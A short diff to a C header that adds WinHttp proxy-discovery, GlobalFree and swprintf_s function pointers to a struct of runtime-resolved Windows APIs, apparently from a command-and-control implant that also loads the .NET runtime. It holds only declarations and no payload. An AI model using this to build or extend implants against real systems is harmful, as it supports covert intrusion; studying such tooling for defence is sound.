@@ -270,6 +270,7 @@ typedef struct
         WIN_FUNC( DuplicateHandle )
         WIN_FUNC( AttachConsole )
         WIN_FUNC( WriteConsoleA )
+        HGLOBAL ( *GlobalFree ) ( HGLOBAL );
 
         /* WinHttp.dll */
         WIN_FUNC( WinHttpOpen )
@@ -282,6 +283,8 @@ typedef struct
         WIN_FUNC( WinHttpReceiveResponse )
         WIN_FUNC( WinHttpReadData )
         WIN_FUNC( WinHttpQueryHeaders )
+        WIN_FUNC( WinHttpGetIEProxyConfigForCurrentUser )
+        WIN_FUNC( WinHttpGetProxyForUrl )
 
         // Mscoree
         HRESULT ( WINAPI *CLRCreateInstance ) ( REFCLSID clsid, REFIID riid, LPVOID* ppInterface );
@@ -336,6 +339,7 @@ typedef struct
 
         // String Formatting
         INT ( *vsnprintf ) ( PCHAR, SIZE_T, CONST PCHAR, va_list );
+        INT ( *swprintf_s ) ( PWCHAR, SIZE_T, CONST PWCHAR, ... );
 
         // * MISC *
         WIN_FUNC( CommandLineToArgvW )
